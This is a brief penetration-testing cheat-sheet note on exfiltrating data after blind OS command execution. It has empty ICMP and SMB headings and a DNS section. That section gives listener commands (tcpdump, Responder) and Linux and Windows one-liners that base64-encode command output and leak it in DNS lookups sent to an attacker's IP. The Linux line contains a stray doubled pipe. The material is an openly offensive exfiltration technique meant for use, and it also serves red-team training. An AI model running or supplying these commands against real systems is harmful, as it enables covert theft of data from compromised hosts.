# General - Data exfiltration

The following note details the technics and tools that can be used to exfiltrate
data through an indirect channel.

This note focus on data exfiltration through a blind OS RCE.  

### ICMP

### DNS

DNS queries can be used to exfiltrate data through the requested domain name.

```
# Listener
tcpdump -i <INTERFACE> udp port 53
# Every Responder's servers can be turned off in Responder.conf, except for the DNS service
responder -i <INTERFACE>

# Linux
<COMMAND> | | while read data; do datab64=`echo $data | base64 -w 0`; host $datab64.ex.data <IP>; done

# Windows
nslookup <%VARIABLE%> <IP>
# The DOS for loop only output the number of columns specified by the tokens parameter. 1 = %a, 2 = %b, etc.
for /f "tokens=1,2,3" %a in ('<COMMAND>') do nslookup %a.%b.%c <IP>
```

### SMB
